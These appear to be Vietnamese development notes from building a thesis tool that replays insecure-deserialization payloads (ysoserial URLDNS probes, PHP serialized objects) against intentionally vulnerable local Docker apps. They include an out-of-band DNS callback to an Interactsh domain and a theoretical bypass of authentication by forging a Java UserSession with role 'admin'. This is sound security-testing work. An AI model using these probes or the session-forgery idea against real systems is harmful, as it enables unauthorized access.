**🟢 Các điểm review khác, chưa cần sửa code:**
- Nhánh `body`/`form_body` wholesale-replace ở `replay_request.py` (rủi ro lý thuyết, nêu lúc review Stage 8) — check lại HAR thật: 0 request có >1 field body/form_body trong dataset này, chưa từng xảy ra thật.
- Số liệu finding bị nhân do HAR có request lặp lại thật (VD `/api/dashboard` có 4 request riêng trong HAR vì load lại trang nhiều lần lúc capture) — không phải bug tool, nhưng cần ghi rõ trong thesis khi trích số liệu.
- [ExploitabilityAnalysis.py:266](D:\Thesis\Thesis\Analyze\ExploitabilityAnalysis.py#L266): `exploit_type = "URLDNS — Deserialization Confirmed"` — chữ "Confirmed" trong tên loại mâu thuẫn với triết lý "không bao giờ tự confirm" của tool (field `confirmation_status` khác luôn là "Suspected"). Chưa sửa — nit nhỏ, để sau nếu cần.

**[ĐÃ FIX] Bug trùng vector `header`/`Cookie` (xem mục `[BUG TÌM RA...]` dưới) — chọn hướng (C) mới, KHÔNG phải (A)/(B) đã bàn trước đó: skip có điều kiện ngay từ Stage 1, không relabel ở `cleanfilter.py`.**

Trong lúc viết plan chi tiết cho hướng (A), user hỏi thẳng: *"tại sao mình không sửa ở bước scan luôn nhờ, mình không đọc cái location = cookies"* — đúng là đơn giản hơn nhiều: nếu không đọc/không tạo vector `header/Cookie` ngay từ đầu thì không có gì để relabel/dedupe ở các bước sau. Đã kiểm tra spec HAR 1.2 (WebFetch bản spec gốc trên GitHub) trước khi chốt: field `cookies` là field bắt buộc phải tồn tại (có thể là mảng rỗng `[]`), nhưng spec KHÔNG đảm bảo tool chụp HAR luôn điền nó đầy đủ mỗi khi có header `Cookie` thô — Chrome DevTools làm tốt (đã xác nhận thật trên `D:\Download\localhost.har`), nhưng HAR từ tool khác (mitmproxy, Burp export...) thì không chắc. Vì vậy chọn **skip có điều kiện**, không skip vô điều kiện.

**Sửa** ([Scanner/har_loader.py](Scanner/har_loader.py) `_process_entry()`):
- Thêm `has_parsed_cookies = bool(req.get('cookies'))` ngay sau `req = entry['request']`.
- Vòng lặp header: thêm điều kiện bỏ qua header `Cookie` khi `has_parsed_cookies` là `True`:
  ```python
  for header in req.get('headers', []):
      if has_parsed_cookies and header['name'].lower() == "cookie":
          continue
      self._add_vector(url, req['method'], "header", header['name'], header['value'], request_context)
  ```
- Không đụng `Analyze/cleanfilter.py` hay `Replay/replay_request.py` — vector trùng không còn được tạo từ gốc nên không có gì để sửa ở các bước sau.

**Verify thật trên `D:\Download\localhost.har`:**
- Script đếm trực tiếp từ HAR: đúng **14 entry** có cả header `Cookie` VÀ `cookies[]` không rỗng.
- `debug_pipeline.py --step 1`: tổng vector giảm từ **303 → 289** (giảm đúng 14), **0 vector `header`/`Cookie`** còn lại.
- `debug_pipeline.py --step 3`: **29 → 29** (Stage 2 == Stage 3) — xác nhận cơ chế fan-out tách composite Cookie header ở `cleanfilter.py` không còn bị kích hoạt nữa (không còn gì để tách).
- Stage 8 (replay thật qua container `java-vuln-app`/`php-vuln-app` sống, user tự khởi động Docker): **56/56 kết quả đều `location: "cookie"`, 0 còn `header`/`Cookie`**, 0 bị `skipped`. Số lượng không phải 139 như bản cũ — lý do: terminal chạy script (git-bash native Windows) không có `java` trong PATH, nên 14 mutation cần `ysoserial` fail ngay từ Stage 7 ([Analyze/payloadMutation.py:_run_ysoserial()](Analyze/payloadMutation.py#L103-L126), lỗi `WinError 2`), field `session` không sinh được mutation nào lần này — hạn chế môi trường chạy, không liên quan tới fix. Mẫu kiểm tra 1 entry `likely_vulnerable: true` (`cookie/ref_tag`, `/api/profile`): baseline `"referral_tag":"O:3:\"Tag\":1:{s:4:\"name\";s:7:\"organic\";}"` → mutated `"referral_tag":"O:3:\"Tag\":1:{s:4:\"name\";s:13:\"administrator\";}"`, status cả 2 đều `200` — server echo đúng giá trị PHP-serialized đã gửi, **không còn entry 401 "Identity Spoofing" giả nào** như trước khi fix.
- Unit test hiện có (`TestCase/`, 64 test) chạy lại: **64/64 pass**, không có test nào đụng tới `har_loader.py` nên không bị ảnh hưởng.

**[XÁC NHẬN] OOB callback thật đã bắt được trên Interactsh — bằng chứng độc lập thứ 2 cho lỗ hổng deserialization ở `session` cookie.** Sau khi set `oob_domain` thật (xem mục dưới) và chạy lại pipeline + gửi payload `java_urldns`, trang Interactsh ghi nhận 1 DNS interaction:
```
QUESTION: qtpticomwslyihdnrpkoz6bcpv3aosizk.oast.fun.  IN  AAAA
From IP: 141.101.110.88 (thuộc dải Cloudflare 141.101.64.0/18 — xác nhận qua cloudflare.com/ips),
lúc 2026-10-11 03:43
```
Domain khớp tuyệt đối với domain cấu hình, query type `AAAA` khớp hành vi `InetAddress`/`URL.hashCode()` của Java khi resolve hostname. IP nguồn là Cloudflare chứ không phải IP container — **bình thường**, không phải noise: do DNS resolver trung gian (hệ thống dùng Cloudflare 1.1.1.1) không forward EDNS Client Subnet ra ngoài theo mặc định, nên authoritative server (Interactsh) chỉ thấy IP resolver, không thấy IP gốc của máy chạy Java. → Kết hợp với bằng chứng `ClassCastException` trong response HTTP (đã note ở các mục trước), đây là 2 nguồn bằng chứng độc lập cùng xác nhận: `session` cookie tại `/api/dashboard` thật sự bị deserialize không kiểm soát.

**Phát hiện thêm (chưa code hoá vào tool) — con đường khai thác thực tế có thể ĐƠN GIẢN HƠN gadget chain RCE:** decode cookie `session` hợp lệ thật (lấy từ `request_context` trong chính file này) ra:
```
class: com.webvulenv.javaapp.model.UserSession
field: role (String) = "user", username (String) = "wiener"
```
Java serialization không có cơ chế ký/integrity-check mặc định (khác `next-auth.session-token` — JWT mã hóa riêng). Vì chính thông báo lỗi `ClassCastException` đã tự tiết lộ đầy đủ tên class + tên field + kiểu field, attacker có đủ thông tin để tự dựng 1 object `UserSession` giả với `role="admin"`, serialize đúng định dạng (không cần gadget chain phức tạp) → nếu server chấp nhận, bypass authentication hoàn toàn. **Chưa thử nghiệm thật — chỉ là phân tích lý thuyết dựa trên cấu trúc đã decode được**, cần test riêng (ngoài phạm vi mutation tool hiện có — tool hiện chỉ tạo `java_urldns` probe cho field `session`, chưa có mutation kiểu "forge object giả theo đúng class/field đã biết").

**[BUG TÌM RA KHI REVIEW STAGE 8 — CHƯA FIX, CẦN QUYẾT ĐỊNH HƯỚNG] Vector `location: "header", name: "Cookie"` bị lệch nhãn, ghi đè sạch toàn bộ cookie thật khi replay → false "Identity Spoofing" + ~50% dữ liệu Stage 8 là trùng lặp vô ích.**

**Gốc rễ (trace từ Stage 1):**
1. [Scanner/har_loader.py](Scanner/har_loader.py) `_process_entry()` lặp qua **2 mảng HAR độc lập** cho cùng 1 request: `req['cookies']` (Chrome tự parse sẵn, mỗi cookie 1 entry `location="cookie"`) VÀ `req['headers']` (dòng `Cookie:` thô dạng composite string, 1 entry `location="header", name="Cookie"`) — xác nhận thật trên `D:\Download\localhost.har`, request `/api/dashboard`: cả 2 mảng đều chứa đúng 4 cookie (`next-auth.session-token`, `ref_tag`, `prefs`, `session`), chỉ khác định dạng (đã-parse vs string thô nối `"; "`).
2. [Analyze/cleanfilter.py](Analyze/cleanfilter.py) `_clean()` (fan-out fix trước đó trong session) tách composite `Cookie:` string, tìm ra segment "giống serialized" (vd `ref_tag=O%3A3%3A...`), strip prefix, chỉ giữ giá trị trần — ĐÚNG để lấy giá trị test, nhưng **KHÔNG đổi lại `location`/`name` của vector** → vector vẫn mang nhãn `location: "header", name: "Cookie"` dù giá trị bên trong giờ chỉ còn nội dung của riêng `ref_tag`/`session`.
3. [Replay/replay_request.py:_send()](Replay/replay_request.py#L106-L149) xử lý theo nhãn (đúng logic, sai vì input nhãn sai từ bước 2):
   - `location == "cookie"`: sửa trong dict `cookies` riêng (dòng 121-123) → cuối hàm (dòng 147-149) flatten dict `cookies` (đủ 4 key, chỉ 1 đổi) vào `headers["Cookie"]` → **ĐÚNG**, giữ nguyên các cookie khác.
   - `location == "header", name == "Cookie"`: sửa THẲNG `headers["Cookie"] = value` (dòng 124-126), bỏ qua dict `cookies` hoàn toàn; guard `is_testing_cookie_header` (dòng 147) cố tình CHẶN bước flatten ở trên chạy → `headers["Cookie"]` cuối cùng **chỉ còn đúng 1 chuỗi payload trần**, mất sạch `next-auth.session-token`/`prefs`/các cookie khác — dù dict `cookies` vẫn còn đủ 4 giá trị gốc trong bộ nhớ, chỉ đơn giản KHÔNG được đọc tới.
   - `location in ("body","form_body")` (dòng 138-142) mắc **lỗi cùng loại**: `body = f"{name}={encoded_value}".encode(...)` ghi đè TOÀN BỘ body, mất các field form khác nếu có — chưa quantify impact thực tế trên dataset hiện có (ít gặp hơn vì ít vector `form_body` trong data test), nhưng về nguyên lý là cùng 1 class bug với `header/Cookie`.

**Hệ quả đã quantify trên `debug_step8.json` (139 entries, đếm bằng script Python thật qua WSL):**
- `location="header", name="Cookie"`: **69 entries**
- `location="cookie"` (ref_tag: 56, session: 13): **69 entries**
- → **69/139 (≈50%) là bản sao trùng lặp** của đúng 69 entry kia — cùng field gốc, cùng payload, chỉ khác nhãn.
- Case cụ thể `/api/dashboard`, `header/Cookie`, payload `ref_tag="administrator"`: `baseline=200 {"role":"user",...}` → `mutated=401 {"error":"Not authenticated"}`, gắn `exploit_type: "Identity Spoofing"`, `likely_vulnerable: true` — **SAI về diễn giải**: 401 xảy ra với BẤT KỲ payload nào ở vị trí này (vì mất session token thật), không chứng minh được gì về "giả mạo danh tính". Vector `cookie/ref_tag` song song (cùng payload) cho `200`, không đổi gì — đúng hành vi thật (server không xử lý `ref_tag` ở endpoint này).

**2 hướng fix đã bàn với user, CHƯA chốt:**
- **(A) — tôi khuyến nghị:** Khi `cleanfilter.py` tách được 1 segment từ composite `Cookie:` header, **relabel vector** thành `location: "cookie", name: <tên cookie thật, vd "ref_tag">` thay vì giữ `"header"/"Cookie"` → vector này sẽ trùng hoàn toàn với vector gốc từ mảng `cookies[]` → khử trùng (dedupe) ở `VectorFiltering`/`cleanfilter` → giảm ~50% dataset, loại bỏ false signal, tận dụng lại đúng cơ chế `cookies[name]=value` đã chạy đúng. Rủi ro: cần sửa return type của `_clean()` (hiện `list[str]`) để mang theo cả tên field gốc, không chỉ giá trị — động vào function đã sửa 1 lần trong session này, cần test lại kỹ cả Java lẫn PHP dataset.
- **(B) — thay thế:** Giữ `header/Cookie` làm vector riêng (test "kiểm soát toàn bộ literal header string", có ý nghĩa riêng cho CRLF injection/header smuggling — KHÁC mục đích với test 1 field cụ thể) nhưng sửa `_send()` để khi `is_testing_cookie_header`, **merge `value` vào đúng vị trí segment trong chuỗi composite gốc** (thay thế tại chỗ) thay vì ghi đè toàn bộ — giữ các cookie khác nguyên vẹn trong CÙNG header string. Phức tạp hơn: cần thread thêm "segment này thuộc tên field gốc nào" từ `cleanfilter` xuyên suốt `normalize`→`fingerprint`→`payloadMutation`→`replay` (hiện không có field nào lưu thông tin này).

**[KẾ HOẠCH]** Tối nay (2026-10-11) sẽ cùng user phân tích toàn bộ output Stage 8 (`debug_step8.json`, 139 replay results) xem có hợp lý không — review tổng thể. **Đã làm xong phần phát hiện bug trên** (trùng lặp 50% + false Identity Spoofing); còn lại: xem các entry khác trong 139 kết quả có vấn đề tương tự/khác không, và chốt hướng fix (A) hay (B).

**[CONFIG] Set `oob_domain` thật trong `config.json`** — user lấy domain Interactsh thật (`qtpticomwslyihdnrpkoz6bcpv3aosizk.oast.fun`) từ interactsh-web, điền vào [config.json](config.json#L8) (trước là `""`).

**Tác động**: [Analyze/payloadMutation.py:_mutate_java_urldns()](Analyze/payloadMutation.py#L178-L200) đọc giá trị này qua `get_oob_domain()` ([tool_config.py:46-53](tool_config.py#L46-L53)) — từ lần chạy pipeline (scan→...→mutate) tiếp theo, field `command`/`canary` trong payload `java_urldns` sẽ dùng domain thật này thay cho placeholder `canary.REPLACE_WITH_YOUR_INTERACTSH_DOMAIN.com`, cho phép xác nhận deserialize qua DNS/HTTP interaction log của Interactsh (bằng chứng ngoài băng, độc lập với response HTTP) — chưa verify lại bằng 1 lần chạy pipeline + replay thật để xác nhận domain thật có thực sự xuất hiện trong payload mới và có interaction log ghi nhận hay không.

**[MỚI] `debug_pipeline.py` thêm Stage 8 (Replay)** — theo yêu cầu "trong debug pipline bạn thêm stage 8 là replay cho tôi". Trước đây `debug_pipeline.py` dừng ở Stage 7 (PayloadMutation), muốn xem kết quả Replay phải chạy riêng `main.py assess` trên file đã lưu.

**Sửa** ([debug_pipeline.py](debug_pipeline.py)): thêm `8: "Replay (ReplayRequest/Assess)"` vào `STEP_NAMES`; tách khối `if args.step <= 7: ... return` ra khỏi vòng lặp Stage 4-7; thêm khối Stage 8 — tái dùng ĐÚNG `_apply_replay_confirmation()` từ `main.py` (import trực tiếp, không viết lại logic riêng — tránh lặp/trôi code giữa `main.py` và `debug_pipeline.py`) để Stage 8 ở đây cho ra **y hệt** hành vi `main.py assess` thật (không auto-Confirmed, luôn "Suspected" kèm `observations` + `baseline`/`mutated` đầy đủ).

**Verify thật** — chạy `debug_pipeline.py --har localhost.har --step 8` xuyên suốt cả 8 stage trong 1 lệnh, lên container `java-vuln-app` sống:
- Ra đúng **139 replay results** — khớp số liệu y hệt `main.py scan→analyze→assess` chạy riêng lẻ trước đó.
- **139/139 đều `confirmation_status: "Suspected"`**, 0 entry thiếu `baseline`/`mutated` — xác nhận đúng thiết kế không-tự-confirm.
- Case `/api/integration/receive`, `raw_body`: vẫn hiện đúng `observations` (bằng chứng HashMap) mà không bị gắn nhãn tự động — khớp hệt kết quả đã verify qua `main.py assess`.
- Unit test 64/64 pass (`Ran 64 tests in 135.596s` / `OK`).

**[THAY ĐỔI KIẾN TRÚC LỚN — theo yêu cầu trực tiếp] Bỏ hẳn việc tool tự động gán "Confirmed".** User chỉ ra đúng: cả 5 phép so sánh của `_compare()` (delay/length/status/error-keyword/content-similarity) đều **không đủ tin cậy** để tự động kết luận — delay phụ thuộc mạng/tải server, length threshold tuỳ tiện, error-keyword bỏ sót custom error page (false negative) hoặc trùng từ tình cờ (false positive), content-similarity không phân biệt được "server tự quyết định khác" (bằng chứng thật) với "server chỉ echo lại input" (vô nghĩa — xem case `ref_tag` ở mục dưới). User: *"tôi nghĩ là không nên tự động đưa ra flag hay không flag, tốt nhất nên là log response lại thôi. Để user tự đọc, chứ cứ confirm, suspected thì nó sẽ bị bias và false positive quá"*.

**Thiết kế mới**: tool KHÔNG BAO GIỜ tự gán "Confirmed" nữa — mọi vector đều dừng ở "Suspected", kèm theo ĐẦY ĐỦ raw `baseline`/`mutated` response (status/length/thời gian/200 ký tự đầu body) + `observations` (quan sát tham khảo, không phải kết luận) để người dùng TỰ ĐỌC và TỰ QUYẾT ĐỊNH.

**2 file sửa:**
1. [main.py:_apply_replay_confirmation()](main.py#L24-L39) — bỏ hẳn nhánh `if likely_vulnerable: confirmation_status="Confirmed"`, luôn luôn `"Suspected"`; đổi `confirmed_indicators` → `observations` (đúng bản chất: gợi ý, không phải bằng chứng xác nhận).
2. [main.py:report command](main.py#L220-L253) — phát hiện thêm: report CŨ **chưa từng lưu `baseline`/`mutated`** vào file report cuối cùng (chỉ có `confirmed_indicators`/`replay_note` dạng tóm tắt) — tức trước đây dù có fix `_compare()` giỏi cỡ nào, user đọc report cũng KHÔNG THẤY được raw response để tự verify. Fix: mọi finding giờ đều có `baseline`+`mutated` đầy đủ. Bỏ 2 bucket `confirmed_findings`/`suspected_findings`, gộp thành 1 danh sách `findings` duy nhất.
3. [Utility/schemas.py](Utility/schemas.py#L62-L64) — đổi field `confirmed_indicators` → `observations` cho khớp.

**`_compare()`/`replay_request.py` KHÔNG cần sửa gì thêm** — vẫn tính 5 quan sát như cũ, nhưng giờ chỉ là THÔNG TIN THAM KHẢO đính kèm, không còn quyết định status nữa — nên bug "ref_tag bị Confirmed nhầm" (đang debug dở ở mục trước) **tự động biến mất**, không cần vá `_compare()` cho chính xác tuyệt đối nữa.

**Verify thật trên cả Java (139 vector) và PHP (11 vector)**:
- `report` không còn in "Confirmed: N" nữa, chỉ còn `"[+] Total findings: N — all require manual review, tool does not auto-confirm"`.
- Case `dashboard.php/session/flip_boolean` (leo thang đặc quyền THẬT, role user→admin): có `observations` ghi rõ bằng chứng, có đủ `baseline`/`mutated`, nhưng KHÔNG bị tự gắn "Confirmed" — người đọc tự thấy bằng chứng rõ ràng.
- Case `profile.php/ref_tag` (mồi nhử, server chỉ echo): CŨNG có `observations` (vì content có đổi), nhưng CŨNG không tự gắn gì — đọc `baseline`/`mutated` sẽ tự nhận ra chuỗi `"administrator"` xuất hiện y nguyên là do chính mình gửi lên, không phải bằng chứng thật.
- Cả 2 case giờ **đối xử bình đẳng, không bias** — đúng yêu cầu.
- Unit test 64/64 pass (`Ran 64 tests in 183.911s` / `OK`), không test nào assert `confirmed_indicators`/`"Confirmed"` nên không cần sửa test nào.

**[FIX] `_compare()` thêm khả năng nhận diện "nội dung response đổi" — nhưng THU HẸP PHẠM VI có chủ đích, không áp dụng chung.** Giải quyết đúng khoảng trống đã note ở mục trước (`receivedType` đổi `String`→`HashMap` nhưng không bị flag vì status/length/delay/keyword đều không đổi).

**Lý do KHÔNG làm đại trà (tự phát hiện trước khi code)**: nếu áp "body khác nội dung → flag" cho MỌI location (kể cả `cookie`/`header`), sẽ false-positive tràn lan trên BẤT KỲ app thật nào có session — vì đổi giá trị cookie session thành rác luôn khiến app phản hồi khác (vd: "chưa đăng nhập" thay vì dashboard) HOÀN TOÀN BÌNH THƯỜNG, không liên quan gì deserialize. Quyết định: chỉ bật check mới cho `raw_body`/`body`/`form_body` (nơi giá trị CHÍNH LÀ payload bị xử lý trực tiếp, không phải credential/auth token mà đổi giá trị tự nhiên đổi hành vi app).

**Sửa** ([Replay/replay_request.py:_compare()](Replay/replay_request.py#L173-L208)): thêm tham số `location`, thêm `CONTENT_DIFF_LOCATIONS = {"raw_body","body","form_body"}`, thêm check thứ 5 — chỉ trigger khi: location nằm trong tập trên, status KHÔNG đổi, length KHÔNG đổi đáng kể (>50%), không có error keyword, VÀ `body_sample` khác nhau — tránh trùng lặp tín hiệu với 4 check cũ.

**Verify thật trên đúng bộ dữ liệu 139 entry đã có (không capture lại)**:
- `/api/integration/receive`, `raw_body/payload`, `java_urldns`: **Suspected → Confirmed**, indicator mới hiện rõ bằng chứng `receivedType` đổi.
- Toàn bộ 10 entry khác của CHÍNH endpoint này (`cookie/ref_tag`, `cookie/session`, `header/Cookie`) vẫn `Suspected, indicators: []` — xác nhận scope thu hẹp đúng, không bị flag lây.
- So sánh TOÀN BỘ 139 entry cũ vs mới: **đúng 1 entry đổi status**, 138 entry còn lại y hệt — xác nhận không có false positive mới phát sinh ở bất kỳ đâu khác trong dữ liệu thật.
- Unit test 64/64 pass (`Ran 64 tests in 122.676s` / `OK`).

**[FIX TẬN GỐC] Thêm field `request_context` — Replay không còn mất Content-Type/cookie khác của request gốc.** Giải quyết đúng bug đã phát hiện ở mục trước (baseline cũng bị 415 vì thiếu Content-Type) VÀ bug cũ đã note trước đó (-35: cookie khác bị bỏ khi test 1 cookie) — cả 2 cùng 1 nguyên nhân gốc: `_send()` chỉ dựng request từ ĐÚNG 1 field đang test, bỏ hết phần còn lại của request gốc.

**Thiết kế**: thêm 1 field `request_context` (`{"headers": {...}, "cookies": {...}, "body": "..."}`) đi kèm MỌI vector từ Stage 1 tới Stage 8, snapshot toàn bộ request gốc.

**5 file đã sửa:**
1. [Utility/schemas.py](Utility/schemas.py) — thêm `RequestContext` TypedDict; tách `ScanVector`/`MutationVector` thành Required+Extra (theo đúng pattern đã có sẵn ở `MutationPayload`/`ConfirmedExploitResult`) để `request_context` là optional; thêm vào `MutationPayloadExtra`.
2. [Scanner/har_loader.py](Scanner/har_loader.py) — `_process_entry()` build `request_context` 1 lần/entry (`_build_request_context()`: gộp hết `headers`/`cookies` thành dict, lấy `postData.text` làm `body`), truyền vào `_add_vector()` để MỌI vector sinh từ cùng 1 request đều mang theo.
3. [Analyze/payloadMutation.py:_make_payload()](Analyze/payloadMutation.py#L128-L145) — thêm `"request_context": self.vector.get("request_context")` — đây là ĐIỂM NGHẼN TRUNG TÂM, xác nhận cả 23 chỗ gọi (Java/PHP/Pickle/YAML/Node/Ruby/.NET/wrapper...) đều qua đúng hàm này nên chỉ sửa 1 chỗ là đủ cho mọi loại payload.
4. [Replay/replay_request.py:_send()](Replay/replay_request.py#L105-L145) — thay vì bắt đầu từ `headers={"User-Agent":...}, cookies={}, body=None`, giờ seed từ `request_context`: copy toàn bộ header gốc (trừ `Content-Length`/`Host` — lý do dưới), toàn bộ cookie gốc, body gốc — rồi MỚI ghi đè đúng field đang test lên trên (logic cũ giữ nguyên, chỉ thêm bước seed trước nó).
   - **Edge-case tự bắt được khi code**: nếu copy nguyên `Content-Length` gốc (vd `12` cho payload "hello" cũ) nhưng mutate body dài hơn, `urllib.request` KHÔNG tự tính lại (chỉ set `Content-Length` nếu header đó chưa có) → request sai lệch. Fix: loại `content-length` (và `host`, để urllib tự derive từ URL) khi seed header.
   - **Edge-case thứ 2 tự bắt được**: khi ĐANG TEST chính `location=header,name=Cookie` (mutate cả chuỗi cookie thô), bước rebuild `headers["Cookie"]` từ `cookies` dict (vốn không phản ánh mutation) sẽ GHI ĐÈ mất giá trị vừa set — thêm guard `is_testing_cookie_header` để bỏ qua bước rebuild đó trong đúng trường hợp này.
   - `postfiltered.py`'s `filter()` xác nhận append thẳng `vector` reference (dòng 69), và `cleanfilter.py`'s `{**vector, ...}` (fix trước) — cả 2 đều tự động giữ `request_context` không cần sửa gì thêm.

**Verify thật — dựng lại HAR từ chính dữ liệu THẬT đã capture** (không bịa giá trị: lấy đúng `Content-Type`/`Cookie`/`raw_body` đã có sẵn trong `debug_step1.json` thật của `/api/integration/receive`), chạy `scan → analyze → assess` đầy đủ qua container `java-vuln-app` sống:
- Xác nhận `request_context` có mặt trên MỌI vector sau `scan` (headers count=3 đúng).
- **Baseline giờ là 200** (trước fix: 415 cho mọi test, kể cả baseline — đã chứng minh ở mục trên).
- **Payload `java_urldns` mutate lên `raw_body`**: `mutated` trả về `{"receivedType":"java.util.HashMap",...}` thay vì `"java.lang.String"` như baseline — **bằng chứng deserialization THẬT xảy ra** (server đã `ObjectInputStream.readObject()` thành công object tấn công `HashMap`+`URL`, không phải `String` gốc nữa). Đây là lần đầu tiên trong suốt session pipeline THẬT (không phải tôi tự curl) chạm tới sink thật của CVE-2026-47864.
- **Giới hạn mới phát hiện (chưa fix)**: dù có bằng chứng rõ (`receivedType` đổi + chậm hơn hẳn 0.64s so với 0.007-0.016s mọi test khác), `_compare()` vẫn báo `likely_vulnerable: false` — vì nó chỉ check status/length-50%/delay≥4s(`TIME_DELAY_THRESHOLD_SEC`)/error-keyword, không check nội dung field cụ thể đổi. Ghi nhận làm việc tiếp theo, chưa fix.
- **Regression**: unit test 64/64 pass (`Ran 64 tests in 181.185s` / `OK`), không file test nào cover `_send()`'s cấu trúc header cũ nên không cần sửa test.

**[BỎ TÍNH NĂNG — quyết định scope]** Xoá hẳn `scan --url` (live browser capture qua `BrowserScanner`/Playwright) khỏi tool. Lý do: qua thảo luận thực tế với `/api/integration/receive` (endpoint cần bấm nút mới lộ ra), xác nhận `BrowserScanner` ([browser_automated_scan.py](Scanner/browser_automated_scan.py) cũ, đã xoá) chỉ `page.goto()` + đợi — không tự click/crawl — nên chỉ bắt được đúng traffic tự fire khi load trang, vô dụng với bất kỳ app nào có flow tương tác (gần như mọi app thật). Giữ lại dễ gây hiểu lầm là "tool tự động quét toàn diện" trong khi thực chất rất hẹp. Quyết định: thà xoá, dùng `-i`/`--har` (HAR tự capture, pentester chủ động click/điều hướng trước) làm đường duy nhất cho Stage 1 — đơn giản hoá đúng năng lực thật của tool, không cần caveat dài dòng trong thesis.

**Phạm vi đã xoá** — xác nhận bằng grep toàn repo, chỉ còn sót trong `note.md` (lịch sử, không sửa):
- `Scanner/browser_automated_scan.py` — xoá file.
- `main.py` — bỏ `import asyncio` (chỉ dùng cho `asyncio.run(scanner.start())`), bỏ `--url` argument, bỏ nhánh `if args.url:`.
- `debug_pipeline.py` — bỏ `import asyncio`, bỏ `--url` argument, bỏ nhánh browser-scan, sửa `STEP_NAMES[1]` từ `"Scan (HarLoader/BrowserScanner)"` → `"Scan (HarLoader)"`.
- `Dockerfile` — bỏ hẳn bước `pip install playwright && playwright install --with-deps chromium` (giảm size image, không còn cần Chromium headless).
- `README.md` — bỏ dòng lệnh `scan --url` mẫu, bỏ dòng playwright trong bảng "Requires", sửa "5 mutation paths" → "4 mutation paths" (vì scan không tính là mutation path, dòng cũ đếm nhầm), bỏ dòng `browser_automated_scan.py` trong cây thư mục.

**Verify thật**: `main.py scan --help`/`debug_pipeline.py --help` không còn `--url`; `main.py scan --har ...` vẫn chạy bình thường (không crash do thiếu import); **unit test 64/64 pass** (`Ran 64 tests in 127.715s` / `OK`), không file test nào từng cover `BrowserScanner` nên không cần sửa test nào.

**[QUY TẮC MỚI — áp dụng mọi lần sau]** Mỗi khi tạo API mới trong `Web_vul_env` (java-app/php-app), API đó **BẮT BUỘC phải được gọi từ chính web** (có nút/form/JS thật trên 1 trang HTML gọi tới nó) — không được để endpoint chỉ gọi được bằng `curl` tay.

**Lý do bị bắt lỗi**: `POST /api/integration/receive` (mô phỏng CVE-2026-47864, xem note cũ -33) được tạo xong, verify hoạt động đúng qua `curl`, nhưng **không hề gắn vào bất kỳ trang HTML nào** — user chỉ ra đúng: "web tạo ra API thì phải có API đó được gọi hay được dùng trên web, tạo ra 1 API chỉ để curl mới gọi được thì làm cái quái gì". Hậu quả thực tế: `BrowserScanner`/`HarLoader` chỉ ghi lại request THẬT SỰ xảy ra (xem [browser_automated_scan.py:14-26](../Thesis/Scanner/browser_automated_scan.py#L14-L26) — chỉ `page.goto()` + đợi, không tự click/crawl gì khác) → endpoint không gắn UI thì **Stage 1 (Scan) không bao giờ sinh vector cho nó**, toàn bộ pipeline phía sau vô dụng với nó. Tool `EthicalQuoc` chỉ có thể test cái NÓ QUAN SÁT ĐƯỢC qua traffic, không tự phát hiện endpoint ẩn (không có giai đoạn recon/fuzzing riêng).

**Fix áp dụng ngay cho `/api/integration/receive`** — thêm card UI "Partner integration sync" vào [dashboard.html](../Web vul env/java-app/src/main/resources/static/dashboard.html) (java-app), đúng pattern PHP đã làm cho SSRF/LFI (input + button + `<pre>` output): input mặc định giá trị base64 `rO0ABXQABWhlbGxv` (= bytes `ac ed 00 05 74 00 05 68 65 6c 6c 6f`, serialize chuẩn của `"hello"`, đã verify thật ở note -33), nút "Send" chạy JS decode base64 → `Uint8Array` → `fetch()` với đúng header `Content-Type: application/x-java-serialized-object` tới `/api/integration/receive`.

**Verify thật qua Docker rebuild**: `docker build` lại image, chạy container mới — `curl .../dashboard.html` xác nhận có cả 3 marker (`syncBtn`, `syncPayload`, `api/integration/receive`); mô phỏng đúng request mà nút này gửi → `{"receivedType":"java.lang.String","success":true}` (giống kết quả tay trước đó); regression check `api/login` + `api/dashboard` không bị ảnh hưởng.

**Giới hạn còn lại cần nhớ**: `BrowserScanner` chỉ tự chạy khi LOAD trang, **không tự click nút** — nên muốn `/api/integration/receive` xuất hiện trong HAR thật, phải TỰ TAY bấm nút "Send" trong lúc DevTools đang ghi (giống cách capture `debug_step1.json`), không thể chỉ chạy `--url` tự động.

**[FIXED — bug thật, không phải do session này gây ra] `Analyze/cleanfilter.py` mất dữ liệu khi 1 header có NHIỀU cookie đều "trông giống serialized"**. Phát hiện khi soi tay `debug_step3.json` thật: vector `location=header,name=Cookie` của `dashboard.html` (chuỗi `Cookie:` gộp cả `ref_tag=...` và `session=...`) chỉ giữ lại ĐÚNG giá trị `ref_tag`, mất hẳn `session` (payload Java serialization thật).

Root cause ([cleanfilter.py:26-29](Analyze/cleanfilter.py#L26-L29) bản cũ):
```python
if '; ' in cleaned:
    segments = [s.strip() for s in cleaned.split('; ')]
    suspicious = [s for s in segments if signatures.looks_like_serialized(s)]
    cleaned = suspicious[0] if suspicious else segments[0]   # chỉ lấy CÁI ĐẦU TIÊN
```
Cả `ref_tag=O:3:"Tag":1:{...}` (khớp `PHP_STRONG`) và `session=rO0AB...` (khớp `"rO0AB" in value`) đều pass `looks_like_serialized()` ([signatures.py:172-173](Utility/signatures.py#L172-L173), [signatures.py:177](Utility/signatures.py#L177)) — nhưng code chỉ giữ `suspicious[0]`, `ref_tag` luôn thắng vì đứng trước `session` trong chuỗi header, **âm thầm bỏ `session`, không cảnh báo gì**.

**Fix**: đổi `_clean()` từ trả về 1 `str` sang trả về `list[str]` (giữ TẤT CẢ segment trông giống serialized, không chỉ cái đầu), `_clean_all()` flatmap thành nhiều vector tương ứng — xác nhận không ai khác gọi `_clean()` trực tiếp (chỉ `_clean_all()` dùng nó) nên đổi type trả về an toàn.

**Verify thật**: chạy lại `-i debug_step1.json --step 3` → 27 vector vào, **34 ra** (tăng đúng 7 — mỗi request có cả `ref_tag`+`session` trong header sinh thêm 1 vector); `dashboard.html`'s `header/Cookie` giờ tách đúng 2 vector (`ref_tag` và `session` riêng, verify bằng script Python đọc trực tiếp file); full pipeline `--step 7` chạy hết không lỗi (27→34 vector xuyên suốt); **unit test 64/64 pass** (`Ran 64 tests in 192.908s` / `OK`), không file test nào assert hành vi cũ nên không cần sửa test.

